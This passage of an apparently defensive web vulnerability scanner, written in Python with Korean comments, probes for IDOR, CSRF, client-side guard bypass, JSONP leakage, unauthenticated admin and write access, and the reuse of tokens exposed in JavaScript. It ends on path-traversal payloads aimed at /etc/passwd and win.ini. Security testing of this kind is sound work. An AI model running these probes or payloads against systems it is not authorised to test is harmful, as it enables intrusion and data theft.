                        f"3) 동일 자원을 '무인증'으로 요청하면 접근 불가(로그인/거부) → 이 자원은 인증이 "
                        "필요하지만 '소유권 검증'은 없어, 로그인만 하면 임의 객체를 읽을 수 있음(IDOR).\n"
                        "→ 비파괴 읽기전용으로 확증. 공격자는 id 를 순회해 타 사용자 데이터를 열람할 수 있음."),
                }
    return None


def _probe_csrf_candidates(points: list[dict], cookies: list | None = None) -> dict | None:
    """CSRF 후보: 상태변경성 요청(POST/PUT/DELETE 폼)에서 CSRF 토큰 부재 + 세션 쿠키 SameSite
    미흡을 수동 검토 후보로 수집한다. 실제 상태 변경 요청은 수행하지 않는다(비파괴)."""
    cands: list[dict] = []
    seen: set = set()
    for pt in points:
        if pt.get("source") not in _FORM_SOURCES:
            continue
        method = (pt.get("method") or "GET").upper()
        if method not in ("POST", "PUT", "DELETE"):
            continue
        if pt.get("csrf_fields"):
            continue  # 토큰 존재 → 후보 아님(서버 검증 여부는 별도 확정 경로가 담당)
        path = urllib.parse.urlparse(pt.get("url", "")).path
        key = (method, path)
        if key in seen:
            continue
        seen.add(key)
        cands.append({
            "url": pt.get("url", ""), "method": method,
            "params": list((pt.get("params") or {}).keys()),
            "reason": "상태변경성 요청에 anti-CSRF 토큰 필드가 없음 (Origin/Referer 검증도 수동 확인 필요)",
        })
    weak_samesite: list[dict] = []
    for c in (cookies or []):
        if not isinstance(c, dict):
            continue
        ss = (c.get("samesite") or "").lower()
        if ss in ("", "none"):
            weak_samesite.append({
                "name": c.get("name") or "(쿠키)",
                "samesite": c.get("samesite") or "미설정",
            })
    if not cands and not weak_samesite:
        return None
    parts = []
    if cands:
        parts.append(f"CSRF 토큰 없는 상태변경 요청 {len(cands)}건")
    if weak_samesite:
        parts.append(f"SameSite 미흡 쿠키 {len(weak_samesite)}건")
    return {
        "type": "csrf_candidate",
        "candidates": cands[:50],
        "weak_samesite_cookies": weak_samesite[:20],
        "count": len(cands),
        "confirmed": False,
        "evidence": (
            f"{' · '.join(parts)} — CSRF 가능성을 수동 검토하십시오. "
            f"실제 상태 변경 요청은 수행하지 않았습니다."
        ),
    }


def _probe_business_logic_candidates(points: list[dict]) -> dict | None:
    """비즈니스 로직 민감 파라미터(role/admin/price/amount/point/permission 등) 수집.
    자동 조작은 수행하지 않고 수동 검토 후보로만 보고한다."""
    import candidate_verification as _cv
    cands = _cv.classify_business_logic_params(points)
    # 스펙 없는 안티패턴 추론: 크롤 입력점에서 operation 을 추론해 BOLA/MASS_ASSIGN/
    # PRICE_TAMPER/REPLAY/STEP_SKIP 안티패턴 후보를 생성한다(Swagger 스펙이 없어도 동작).
    anti = []
    try:
        import api_audit as _aa
        anti = _aa.business_logic_candidates(_aa.operations_from_points(points))
    except Exception:
        anti = []
    if not cands and not anti:
        return None
    _msg = f"비즈니스 로직 관련 파라미터 {len(cands)}건"
    if anti:
        _pats = sorted({a.get("pattern") for a in anti})
        _msg += f" + 안티패턴 후보 {len(anti)}건({', '.join(_pats)})"
    return {
        "type": "business_logic_candidate",
        "candidates": cands[:50],
        "anti_patterns": anti[:40],   # 스펙 없이 추론한 안티패턴 후보(SAFE 레시피 포함)
        "count": len(cands) + len(anti),
        "confirmed": False,
        "evidence": (
            f"{_msg} 발견(가격/권한/포인트·객체참조·재사용·단계우회 등) — "
            f"파라미터 변조/접근제어 가능성을 수동 검토 필요. 자동 조작 미수행(비파괴)."
        ),
    }


# ── CWE-602: 클라이언트 전용 검증의 서버측 미강제(가드 우회) ─────────────────────────
_CONSENT_NAME_RE = re.compile(r'(agree|consent|terms|policy|privacy|약관|동의|필수)', re.IGNORECASE)
_LISTY_NAME_RE = re.compile(r'(list|domains?|items?|batch|bulk|목록|여러|multi)', re.IGNORECASE)


async def _probe_clientside_guard_bypass(session, base_url: str, points: list[dict],
                                         discovered_urls: list[str] | None = None,
                                         scan_id: str = "") -> dict | None:
    """CWE-602: 클라이언트/JS 에만 있는 검증(동의 체크·개수 제한)을 서버가 재검증하지 않는지
    서버측 차등으로 비파괴 실증한다. 점검 대상 전반에서 반복 확인되는 클래스.
      (A) 동의/필수 필드 우회: 정상 제출(baseline) vs 해당 필드 제거 제출 → 둘 다 수락+오류무 → 미강제
      (B) 개수 제한 우회: JS 의 상한 N 을 넘겨(N+1) 제출 → 수락+(N+1)번째 반영 → 미강제
    """
    import client_analysis as _ca
    try:
        _, html, _ = await _get(session, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return None
    html = html or ""
    # JS 수집(같은 출처): HTML script src + 발견 URL 의 .js
    js_urls = _ca.same_origin_js_urls(html, base_url)
    for u in (discovered_urls or []):
        if (u.split("?")[0].lower().endswith(".js") and _url_in_scope(u, base_url)
                and u not in js_urls):
            js_urls.append(u)
    js_blob = _ca.inline_scripts(html)
    for ju in js_urls[:15]:
        try:
            _, jb, _ = await _get(session, ju)
            if jb:
                js_blob += "\n" + jb
        except ScanInterrupted:
            raise
        except Exception:
            pass
    guards = _ca.extract_client_guards(html, js_blob)
    guard_fields = {f.lower() for f in (guards["consent_fields"] + guards["required_fields"])}
    count_limits = [n for n in guards["count_limits"] if 2 <= n <= 200]

    form_pts = [p for p in points if p.get("method") == "POST"
                and p.get("source") in _FORM_SOURCES and p.get("params")][:6]

    for pt in form_pts:
        params = pt["params"]
        # ── (A) 동의/필수 필드 우회 ──────────────────────────────────────────────
        target = next((k for k in params
                       if k.lower() in guard_fields or _CONSENT_NAME_RE.search(k)), None)
        if target:
            try:
                _sb, body_with, _ = await _post(session, pt["url"], data={**params})
                reduced = {k: v for k, v in params.items() if k != target}
                _sv, body_wo, _ = await _post(session, pt["url"], data=reduced)
            except ScanInterrupted:
                raise
            except Exception:
                body_with = body_wo = None
                _sb = _sv = 0
            # 정상 제출이 수락되고(baseline), 필드 제거해도 수락+새 오류 없음 → 서버 미강제
            if (_sb in (200, 201, 302) and _sv in (200, 201, 302)
                    and not _ca.find_errors(body_wo or "")):
                # 대조 강화: 필드 제거본이 with 대비 '거부 신호'가 늘지 않았는지
                errs_with = set(_ca.find_errors(body_with or ""))
                errs_wo = set(_ca.find_errors(body_wo or ""))
                if not (errs_wo - errs_with):
                    return {
                        "type": "consent_bypass", "confirmed": True, "cwe_hint": "CWE-602",
                        "url": pt["url"], "param": target, "method": "POST",
                        "evidence": (f"클라이언트 전용 검증 미강제(CWE-602): 필수/동의 필드 '{target}' 를 "
                                     f"제거하고 제출해도 서버가 동일하게 수락(HTTP {_sv}, 신규 오류 없음) — "
                                     f"동의/필수 검증이 서버측에서 재검증되지 않음."),
                        "affected_endpoints": [pt["url"]],
                    }
        # ── (B) 개수 제한 우회 ─────────────────────────────────────────────────────
        listy = next((k for k in params if _LISTY_NAME_RE.search(k)), None)
        if listy and count_limits:
            N = min(count_limits)
            marker = f"eoseureumguard{(scan_id or 'x').replace('-', '')[:6]}"
            base_items = [f"{marker}-{i}.test" for i in range(1, N + 1)]
            over_items = [f"{marker}-{i}.test" for i in range(1, N + 2)]   # N+1
            try:
                _, body_base, _ = await _post(
                    session, pt["url"], data={**params, listy: "\n".join(base_items)})
                _so, body_over, _ = await _post(
                    session, pt["url"], data={**params, listy: "\n".join(over_items)})
            except ScanInterrupted:
                raise
            except Exception:
                body_over = None
                _so = 0
            # N+1 이 수락되고(오류 없음) N+1 번째 항목이 응답에 반영 → 상한 미강제
            over_last = f"{marker}-{N + 1}.test"
            if (_so in (200, 201, 302) and not _ca.find_errors(body_over or "")
                    and _ca.find_reflected(body_over or "", over_last)):
                return {
                    "type": "count_limit_bypass", "confirmed": True, "cwe_hint": "CWE-602",
                    "url": pt["url"], "param": listy, "method": "POST",
                    "evidence": (f"클라이언트 전용 개수 제한 미강제(CWE-602): JS 상한 {N} 을 넘겨 "
                                 f"{N + 1}개 제출 → 서버가 수락하고 {N + 1}번째 항목({over_last})이 응답에 "
                                 f"반영됨 — 개수 제한이 서버측에서 재검증되지 않음."),
                    "affected_endpoints": [pt["url"]],
                }
    return None


async def _collect_page_js(session, base_url: str, discovered_urls: list[str] | None = None,
                           cap: int = 15) -> tuple[str, str]:
    """base_url HTML 과 같은 출처 JS 본문(인라인+외부)을 모아 (html, js_blob) 반환.
    _probe_js_secrets 의 페치 경로를 공유 헬퍼로 일반화(가드/토큰/JSONP 프로브가 재사용)."""
    import client_analysis as _ca
    try:
        _, html, _ = await _get(session, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return "", ""
    html = html or ""
    js_urls = _ca.same_origin_js_urls(html, base_url)
    for u in (discovered_urls or []):
        if (u.split("?")[0].lower().endswith(".js") and _url_in_scope(u, base_url)
                and u not in js_urls):
            js_urls.append(u)
    js_blob = _ca.inline_scripts(html)
    for ju in js_urls[:cap]:
        try:
            _, jb, _ = await _get(session, ju)
            if jb:
                js_blob += "\n" + jb
        except ScanInterrupted:
            raise
        except Exception:
            pass
    return html, js_blob


_AUTH_COOKIE_RE = re.compile(r'(session|sess|sid|auth|login|token|jwt|remember|_ss)',
                             re.IGNORECASE)


def _auth_cookies_from_headers(headers: dict) -> set:
    """응답 Set-Cookie 에서 인증성 쿠키 이름 집합 추출."""
    if not isinstance(headers, dict):
        return set()
    sc = headers.get("Set-Cookie", "") or headers.get("set-cookie", "")
    names = set()
    for m in re.finditer(r'(?:^|,\s*)([A-Za-z0-9_\-]+)=', sc):
        nm = m.group(1)
        if _AUTH_COOKIE_RE.search(nm):
            names.add(nm)
    return names


async def _probe_js_auth_token(session, base_url: str, discovered_urls: list[str] | None = None,
                               scan_id: str = "") -> dict | None:
    """JS 에 노출된 자동로그인/세션 토큰을 실제 인증 엔드포인트에 재사용해 인증 우회를 실증한다.
    (기존 _probe_js_secrets 는 '발견'만 했다.) baseline(토큰 없음) 대비 토큰 사용 시 인증성
    쿠키 발급 또는 인증 리다이렉트가 새로 나타나면 확증(비파괴 — 세션 획득만, 데이터 변경 없음)."""
    import client_analysis as _ca
    html, js_blob = await _collect_page_js(session, base_url, discovered_urls)
    if not js_blob:
        return None
    tokens = _ca.extract_app_tokens(js_blob)
    endpoints = _ca.token_endpoint_candidates(html, js_blob, base_url)
    if not tokens or not endpoints:
        return None
    endpoints = [e for e in endpoints if _url_in_scope(e, base_url)][:5]
    for ep in endpoints:
        try:
            _sb, _, hb = await _get(session, ep)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        base_cookies = _auth_cookies_from_headers(hb)
        for tok in tokens[:5]:
            for pname in (tok["name"], "token", "auto_login", "key", "access_token"):
                try:
                    q = urllib.parse.urlencode({pname: tok["value"]})
                    _st, _body, ht = await _get(session, ep + ("&" if "?" in ep else "?") + q)
                except ScanInterrupted:
                    raise
                except Exception:
                    continue
                new_cookies = _auth_cookies_from_headers(ht) - base_cookies
                loc = (ht or {}).get("Location", "") if isinstance(ht, dict) else ""
                authed_redirect = bool(loc and _st in (301, 302)
                                       and not re.search(r'(login|signin|auth/|logout)', loc, re.I))
                if new_cookies or authed_redirect:
                    return {
                        "type": "js_token_auth_bypass", "confirmed": True,
                        "url": ep, "param": pname, "method": "GET",
                        "evidence": (f"JS 노출 토큰 인증 우회: 공개 JS 의 토큰('{tok['name']}': {tok['preview']})을 "
                                     f"'{ep}' 에 재사용하니 "
                                     + (f"인증성 쿠키 발급({', '.join(sorted(new_cookies))})"
                                        if new_cookies else f"인증 리다이렉트({loc[:80]})")
                                     + " — 토큰 재사용으로 인증 상태 획득."),
                        "affected_endpoints": [ep],
                    }
    return None


async def _probe_jsonp_misuse(session, base_url: str, points: list[dict],
                              discovered_urls: list[str] | None = None,
                              scan_id: str = "") -> dict | None:
    """JSONP 오용: 임의 콜백명으로 요청 시 응답이 콜백으로 감싸지고(JS 실행형) 크로스오리진
    탈취(XSSI) 가능 → 실증. 콜백 반사(스크립트 실행형)로 확증하고, 민감 필드 포함 시 근거 강화."""
    import client_analysis as _ca
    html, js_blob = await _collect_page_js(session, base_url, discovered_urls)
    d = _ca.detect_jsonp(html, js_blob, base_url)
    cb_names = set(d.get("callback_params") or []) | {"callback", "jsonp", "cb"}
    candidates = list(d.get("endpoints") or [])
    for pt in (points or []):
        if pt.get("method") == "GET" and any(k.lower() in cb_names for k in (pt.get("params") or {})):
            candidates.append(pt["url"] + "?" + urllib.parse.urlencode(pt["params"]))
    candidates = [c for c in dict.fromkeys(candidates) if _url_in_scope(c, base_url)][:8]
    if not candidates:
        return None
    marker = f"eoseureumcb{(scan_id or 'x').replace('-', '')[:6]}"
    _SENS_RE = re.compile(r'(token|session|passwd|password|email|mobile|phone|user|account|'
                          r'card|jumin|ssn|birth|주소|이름|연락처)', re.IGNORECASE)
    for cu in candidates:
        for cb in cb_names:
            sep = "&" if "?" in cu else "?"
            test_url = cu + sep + urllib.parse.urlencode({cb: marker})
            try:
                _st, body, hd = await _get(session, test_url)
            except ScanInterrupted:
                raise
            except Exception:
                continue
            if not body:
                continue
            ct = (hd.get("Content-Type", "") if isinstance(hd, dict) else "").lower()
            wrapped = re.search(rf'(^|[^A-Za-z0-9_]){re.escape(marker)}\s*\(', body)
            if wrapped and ("javascript" in ct or "json" in ct or body.strip().startswith(marker)):
                sens = sorted({m.group(1).lower() for m in _SENS_RE.finditer(body[:5000])})
                sev_note = f" 민감 필드 포함({', '.join(sens[:6])})" if sens else ""
                return {
                    "type": "jsonp_misuse", "confirmed": True,
                    "url": cu, "param": cb, "method": "GET", "has_sensitive": bool(sens),
                    "evidence": (f"JSONP 오용: 콜백명 '{marker}' 지정 시 응답이 {marker}(...) 로 감싸져 "
                                 f"반환(Content-Type: {ct or 'n/a'}) — 임의 사이트가 script 로 로드해 "
                                 f"크로스오리진 탈취 가능(XSSI).{sev_note}"),
                    "affected_endpoints": [cu],
                }
    return None


# ── CWE-598: URL 쿼리스트링에 민감 토큰 노출(Referer/로그 누출) ─────────────────────
_SENSITIVE_URL_PARAM_RE = re.compile(
    r'^(access[_\-]?token|auth[_\-]?token|id[_\-]?token|token|session[_\-]?id|sessionid|'
    r'sid|jsessionid|auth|api[_\-]?key|apikey|secret|password|passwd|pwd|otp|jwt)$',
    re.IGNORECASE)


async def _probe_sensitive_token_in_url(session, base_url: str, points: list[dict],
                                        discovered_urls: list[str] | None = None,
                                        scan_id: str = "") -> dict | None:
    """URL 쿼리스트링에 세션/인증 토큰류가 실려 있으면 Referer 헤더·프록시/서버 로그로 누출될 수
    있다(CWE-598). 발견 URL·입력점의 쿼리 파라미터를 정적 점검(요청 없음, 비파괴)."""
    urls = list(discovered_urls or [])
    for pt in (points or []):
        if pt.get("method") == "GET" and pt.get("params"):
            urls.append(pt["url"] + "?" + urllib.parse.urlencode(pt["params"]))
    hits = []
    seen = set()
    for u in urls:
        if not _url_in_scope(u, base_url):
            continue
        q = urllib.parse.parse_qs(urllib.parse.urlparse(u).query)
        for name, vals in q.items():
            if not _SENSITIVE_URL_PARAM_RE.match(name):
                continue
            val = (vals or [""])[0]
            # 토큰성 값만(1/true 같은 플래그 제외): 길이 8+ 또는 영숫자 혼합
            if len(val) < 8 and not re.search(r'[A-Za-z].*\d|\d.*[A-Za-z]', val):
                continue
            key = (urllib.parse.urlparse(u).path, name)
            if key in seen:
                continue
            seen.add(key)
            hits.append({"url": u.split("?")[0], "param": name,
                         "preview": (val[:6] + "…") if len(val) > 8 else val})
        if len(hits) >= 10:
            break
    if not hits:
        return None
    h0 = hits[0]
    return {
        "type": "token_in_url", "confirmed": True,
        "url": h0["url"], "param": h0["param"], "method": "GET",
        "count": len(hits),
        "evidence": (f"URL 쿼리스트링에 민감 토큰 노출(CWE-598): {len(hits)}건 — 예) "
                     f"{h0['url']}?{h0['param']}={h0['preview']}. Referer 헤더·접근 로그·"
                     f"브라우저 히스토리로 토큰이 누출될 수 있음."),
        "affected_endpoints": [h["url"] for h in hits[:10]],
    }


# ── 미인증 특권 콘텐츠 렌더링(무세션 접근 시 관리 콘텐츠 노출) ────────────────────────
_PRIV_PATH_RE = re.compile(
    r'/(manage|admin|owner|transfer|approve|grant|config|setting|member|account|payment|kcp|'
    r'nameserver|status|dashboard|console|operator)', re.IGNORECASE)
# 정적 에셋(SPA 빌드 번들·이미지·폰트 등)은 특권 엔드포인트가 아니다 — 공개 서빙이 정상.
# (예: /_nuxt/pages/admin/api.<hash>.js 가 경로에 'admin' 을 포함한다고 무인증 관리접근으로 오판 방지)
_STATIC_ASSET_RE = re.compile(
    r'\.(?:js|mjs|css|map|json|woff2?|ttf|otf|eot|png|jpe?g|gif|svg|ico|webp|bmp|avif|mp4|mp3|webm|pdf|zip)$'
    r'|/(?:_nuxt|_next|static|assets|dist|build|chunk|chunks)/', re.IGNORECASE)
# 관리/특권 콘텐츠 마커(응답 본문). 로그인 페이지는 제외해야 함.
_PRIV_CONTENT_RE = re.compile(
    r'(관리자\s*(메뉴|기능|페이지|콘솔)|소유자|네임서버|송금|이체|승인\s*대기|권한\s*(관리|부여|변경)|'
    r'결제\s*내역|정산|대시보드|회원\s*목록|상태\s*변경|RT_CODE|'
    r'admin\s*(panel|console|menu)|management\s*console|owner|transfer|nameserver)', re.IGNORECASE)
_LOGIN_PAGE_RE = re.compile(
    r'(로그인|아이디|비밀번호|login|sign\s*in|password|username|input[^>]*type=["\']password)',
    re.IGNORECASE)


async def _probe_unauth_privileged_content(session, base_url: str, points: list[dict],
                                           discovered_urls: list[str] | None = None,
                                           scan_id: str = "") -> dict | None:
    """미인증 상태로 관리/특권 엔드포인트에 접근했을 때 로그인 유도가 아니라 '관리 콘텐츠'가
    렌더링되면 서버측 인증 누락으로 확정한다(/manage/*/status 패턴). 보수적 확증:
    200 + 특권 콘텐츠 마커 + 로그인 페이지 아님 + (POST 반사 시 근거 강화)."""
    import client_analysis as _ca
    # 특권 엔드포인트 후보: 발견 URL + points 중 경로가 특권성인 것
    cands: list[tuple] = []   # (url, method, params)
    seen = set()
    for u in (discovered_urls or []):
        _p = urllib.parse.urlparse(u).path
        if (_PRIV_PATH_RE.search(_p) and not _STATIC_ASSET_RE.search(_p)
                and _url_in_scope(u, base_url)):
            key = _p
            if key not in seen:
                seen.add(key)
                cands.append((u.split("?")[0], "GET", {}))
    for pt in (points or []):
        p = urllib.parse.urlparse(pt.get("url", "")).path
        if (_PRIV_PATH_RE.search(p) and not _STATIC_ASSET_RE.search(p)
                and pt.get("url") and _url_in_scope(pt["url"], base_url)):
            if p not in seen:
                seen.add(p)
                cands.append((pt["url"], pt.get("method", "GET"), pt.get("params") or {}))
    marker = f"eoseureumpriv{(scan_id or 'x').replace('-', '')[:5]}"
    for url, method, params in cands[:12]:
        try:
            if method == "POST":
                # 반사 확인용 마커를 임의 텍스트 파라미터에 실어 전송
                tp = dict(params)
                _tk = next((k for k in tp if not re.search(r'(csrf|token|nonce)', k, re.I)), None)
                if _tk:
                    tp[_tk] = marker
                _st, body, hd = await _post(session, url, data=tp)
            else:
                _st, body, hd = await _get(session, url)
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if _st != 200 or not body:
            continue
        # 로그인 페이지면 인증이 강제된 것(정상) → 제외
        if _LOGIN_PAGE_RE.search(body[:4000]):
            continue
        has_priv = bool(_PRIV_CONTENT_RE.search(body[:8000]))
        reflected = (method == "POST" and _ca.find_reflected(body, marker))
        # 특권 콘텐츠 마커가 있고(또는 POST 입력이 관리화면에 반사) → 무인증 접근 확정
        if has_priv and (method == "GET" or reflected):
            if has_priv:
                return {
                    "type": "unauth_privileged_content", "confirmed": True,
                    "url": url, "method": method,
                    "evidence": (f"미인증 특권 콘텐츠 접근: 세션 없이 '{url}' 에 {method} 요청 시 "
                                 f"로그인 유도 없이 관리/특권 콘텐츠가 렌더링됨"
                                 + (f"(제출값 '{marker}' 반사 확인)" if reflected else "")
                                 + " — 서버측 인증 강제 누락."),
                    "affected_endpoints": [url],
                }
    return None


# ── 무인증 쓰기 접근통제(Unauthenticated Write BAC) — 비파괴 ──────────────────────
_WRITE_PATH_RE = re.compile(
    r'/(delete|remove|drop|destroy|update|edit|modify|write|create|save|insert|store|'
    r'reply|comment|approve|grant|revoke|ban|deactivate|reset|publish|unpublish|'
    r'notice|board|article|post)[^/]*', re.IGNORECASE)
_WRITE_METHODS = ("POST", "PUT", "DELETE", "PATCH")
_LOGIN_LOC_RE = re.compile(r'(login|signin|sign-in|logon|sso|account/login|auth/)', re.IGNORECASE)
# 처리(쓰기) 성공 근거 — 단순 2xx 재렌더 오탐을 배제하기 위해 성공 문구/처리 신호를 요구.
_WRITE_SUCCESS_RE = re.compile(
    r'(삭제(되었|완료|됨)|등록(되었|완료|됨)|저장(되었|완료|됨)|수정(되었|완료|됨)|작성(되었|완료)|'
    r'처리(되었|완료)|성공(적으로)?|완료되었|deleted|created|updated|saved|removed|success|inserted)',
    re.IGNORECASE)
_ID_PARAM_RE = re.compile(r'(^|_)(id|no|seq|idx|num|pk|uid|sid)$', re.IGNORECASE)
_UNAUTH_NONEXIST_ID = "999000999"      # 존재하지 않을 리소스 ID(비파괴 보장)


def _neutralize_url(url: str, nid: str = _UNAUTH_NONEXIST_ID) -> str:
    """URL 경로의 숫자 세그먼트·쿼리의 ID성 파라미터를 '존재하지 않는 값'으로 치환.
    실제 리소스(예: /board/delete/5)를 절대 건드리지 않도록 비파괴화한다."""
    try:
        p = urllib.parse.urlparse(url)
        segs = [nid if s.isdigit() and len(s) <= 12 else s for s in p.path.split("/")]
        q = [(k, nid if _ID_PARAM_RE.search(k) else v) for k, v in urllib.parse.parse_qsl(p.query)]
        return urllib.parse.urlunparse((p.scheme, p.netloc, "/".join(segs), p.params,
                                        urllib.parse.urlencode(q), ""))
    except Exception:
        return url


async def _send_method(sess, method: str, url: str, data=None, timeout: float = 8.0):
    # S4: 비-GET(상태변경 가능) 메서드는 GET 캐시 무효화
    _c = _response_cache.current()
    if _c is not None and (method or "").upper() != "GET":
        _c.invalidate()
    _t = _adaptive_throttle.stage("active_probing")
    if _t is not None:
        await _t.before()
    _t0 = time.monotonic()
    try:
        async with sess.request(method, url, data=data, allow_redirects=False,
                                headers=_req_headers(url),
                                timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            _res = (r.status, await r.text(errors="ignore"), dict(r.headers))
        _net_record(True)
        if _t is not None:
            _t.after(time.monotonic() - _t0, _res[0], _res[2].get("Retry-After"))
        return _res
    except Exception:
        _net_record(False)
        if _t is not None:
            _t.after(time.monotonic() - _t0, 0, None)
        return 0, "", {}


async def _probe_unauth_write_bac(session, base_url: str, points: list[dict],
                                  discovered_urls: list[str] | None = None,
                                  scan_id: str = "") -> dict | None:
    """무인증 쓰기 접근통제(BAC) — 로그인 없이 상태변경(작성·수정·삭제) 엔드포인트에 도달
    가능한지 '비파괴'로 실증한다. 존재하지 않는 리소스 ID/무해 마커로만 요청해 실제 데이터는
    바꾸지 않고, 인증 게이트(401/403/로그인 리다이렉트) vs 서버 핸들러 도달(2xx·302성공·400/422)
    만 판정한다. 진짜 파괴적 완료(실제 삭제)는 절대 수행하지 않는다(SAFE)."""
    if os.getenv("ENABLE_UNAUTH_WRITE_BAC", "true").strip().lower() in ("0", "false", "no", "off"):
        return None
    marker = f"eoseureumwbac{(scan_id or 'x').replace('-', '')[:6]}"

    cands: list[tuple] = []
    seen = set()
    for pt in (points or []):
        u = pt.get("url", "") or ""
        if not u or not _url_in_scope(u, base_url):
            continue
        path = urllib.parse.urlparse(u).path
        m = (pt.get("method") or "GET").upper()
        if m in _WRITE_METHODS or _WRITE_PATH_RE.search(path):
            key = (path, m if m in _WRITE_METHODS else "POST")
            if key in seen:
                continue
            seen.add(key)
            cands.append((u, m if m in _WRITE_METHODS else "POST", dict(pt.get("params") or {})))
    for u in (discovered_urls or []):
        if not _url_in_scope(u, base_url):
            continue
        path = urllib.parse.urlparse(u).path
        if _WRITE_PATH_RE.search(path):
            key = (path, "POST")
            if key in seen:
                continue
            seen.add(key)
            cands.append((u, "POST", {}))
    if not cands:
        return None

    async with aiohttp.ClientSession(connector=_ssl_connector(), cookie_jar=aiohttp.DummyCookieJar()) as anon:  # 쿠키/세션 없음 = 무인증(egress: i7 경유)
        # 오탐 억제 베이스라인: 존재하지 않는 경로에 무인증 쓰기 → 서버가 '아무거나 성공/거부'로 답하는지
        bogus = base_url.rstrip("/") + f"/eoseureum_nonexist_wbac_{marker}"
        b_st, _b_body, _b_hd = await _send_method(anon, "POST", bogus, data={"x": marker})

        for url, method, params in cands[:10]:
            safe_url = _neutralize_url(url.split("#")[0])
            data = {}
            for k, v in (params or {}).items():
                if _ID_PARAM_RE.search(k):
                    data[k] = _UNAUTH_NONEXIST_ID
                elif re.search(r'(csrf|xsrf|token|nonce|authenticity|_method)', k, re.I):
                    continue                       # 무인증이므로 CSRF 토큰 없음이 정상
                else:
                    data[k] = marker
            if not data:
                data = {"id": _UNAUTH_NONEXIST_ID, "title": marker, "content": marker}
            try:
                st, body, hd = await _send_method(anon, method, safe_url, data=data)
            except ScanInterrupted:
                raise
            if st == 0 or st == b_st:               # 응답 없음 / 존재하지 않는 경로와 동일 반응 → 무의미
                continue
            loc = hd.get("Location") or hd.get("location") or ""
            head = (body or "")[:4000]
            if st in (401, 403):                    # 인증 강제됨 → 안전
                continue
            if st in (301, 302, 303, 307, 308) and _LOGIN_LOC_RE.search(loc):
                continue                            # 로그인으로 리다이렉트 → 안전
            if _LOGIN_PAGE_RE.search(head):
                continue                            # 로그인 페이지 반환 → 안전
            if st in (404, 405, 429, 500, 501, 502, 503):
                continue                            # 엔드포인트 없음/메서드 불가/서버오류 → 판단 보류
            success_like = st in (200, 201, 202, 204) or st in (301, 302, 303, 307, 308)
            reached_handler = success_like or st in (400, 422)   # 400/422 = 인증 게이트 통과 후 검증 오류
            if not reached_handler:
                continue
            # 단순 2xx(폼 재렌더·입력 무시)로 인한 오탐 배제: 마커 반사 또는 성공 문구 등
            # '실제 처리' 근거가 있을 때만 CONFIRMED, 그 외 도달은 POSSIBLE(확인 필요).
            marker_hit = bool(marker and marker in (body or ""))
            success_kw = bool(_WRITE_SUCCESS_RE.search(head))
            if success_like and (marker_hit or success_kw):
                confirmed, confidence = True, "CONFIRMED_RESPONSE"
                hint = "성공 응답 + 처리 근거(" + ("입력 반사" if marker_hit else "성공 문구") + ")"
            else:
                confirmed, confidence = False, "POSSIBLE"
                hint = (f"핸들러 도달(HTTP {st}) — 처리 근거 약함, 수동 확인 필요"
                        if success_like else f"입력 검증 오류(HTTP {st}) — 인증 게이트 통과")
            return {
                "type": "unauth_write_bac", "confirmed": confirmed, "confidence": confidence,
                "url": safe_url, "method": method,
                "evidence": (f"미인증 쓰기 접근통제 취약: 세션(로그인) 없이 '{method} {safe_url}' "
                             f"(상태변경 엔드포인트)에 요청했을 때 로그인 유도 없이 서버 핸들러에 도달함"
                             f"(HTTP {st}, {hint}). 비파괴 검증 — 존재하지 않는 ID/무해 마커만 사용해 "
                             f"실제 데이터는 변경하지 않았습니다. 인증되지 않은 사용자가 게시글 작성·공지 "
                             f"변조·삭제 등 상태 변경을 수행할 수 있습니다."),
                "affected_endpoints": [safe_url],
            }
    return None


_FILE_INPUT_RE = re.compile(r"<input[^>]*type=[\"']file[\"'][^>]*>", re.IGNORECASE)
_FORM_BLOCK_RE = re.compile(r"<form([^>]*)>(.*?)</form>", re.IGNORECASE | re.DOTALL)


def _parse_upload_forms(base_url: str, html: str) -> list[dict]:
    """HTML 에서 파일 업로드(multipart/file input) 폼을 추출한다(분석 전용)."""
    out: list[dict] = []
    for fm in _FORM_BLOCK_RE.finditer(html or ""):
        attrs, inner = fm.group(1), fm.group(2)
        if not _FILE_INPUT_RE.search(inner):
            continue
        enc = re.search(r'enctype=["\']([^"\']+)["\']', attrs, re.IGNORECASE)
        act = re.search(r'action=["\']([^"\']*)["\']', attrs, re.IGNORECASE)
        meth = re.search(r'method=["\']([^"\']+)["\']', attrs, re.IGNORECASE)
        file_inputs = []
        for im in _FILE_INPUT_RE.finditer(inner):
            tag = im.group(0)
            n = re.search(r'name=["\']([^"\']+)["\']', tag, re.IGNORECASE)
            ac = re.search(r'accept=["\']([^"\']*)["\']', tag, re.IGNORECASE)
            file_inputs.append({"name": n.group(1) if n else "",
                                "accept": ac.group(1) if ac else ""})
        action_url = urllib.parse.urljoin(base_url, act.group(1)) if act and act.group(1) else base_url
        out.append({
            "url": action_url, "enctype": (enc.group(1) if enc else ""),
            "method": (meth.group(1) if meth else "POST"), "file_inputs": file_inputs,
        })
    return out


async def _probe_file_upload_candidate(session, base_url: str) -> dict | None:
    """파일 업로드 폼 분석(실제 업로드/웹쉘 금지). 업로드 통제 정보만 수집."""
    import candidate_verification as _cv
    try:
        _, body, _ = await _get(session, base_url)
    except Exception:
        return None
    forms = _parse_upload_forms(base_url, body or "")
    analyzed = _cv.analyze_file_upload_forms(forms)
    if not analyzed:
        return None
    return {
        "type": "file_upload_candidate",
        "candidates": analyzed[:30],
        "count": len(analyzed),
        "confirmed": False,
        "evidence": (
            f"파일 업로드 폼 {len(analyzed)}건 발견 — 서버측 확장자/콘텐츠 검증을 수동 확인 필요. "
            f"실제 파일/웹쉘 업로드는 수행하지 않았습니다."
        ),
    }


# ── PT: 경로 추적 (LFI / Path Traversal) ────────────────────────────────────────

_LFI_PARAMS = {
    "file", "path", "page", "include", "template", "view", "load", "doc",
    "name", "src", "lang", "locale", "dir", "module", "show", "display",
    "filename", "filepath", "read", "open",
}

_LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2F%2F%2F%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "/etc/passwd",
    "../../../../windows/win.ini",
    "C:\\windows\\win.ini",
    "....\\....\\....\\windows\\win.ini",
    # PHP 필터 래퍼 — 소스코드 base64 추출 (webhacking.kr 기법)
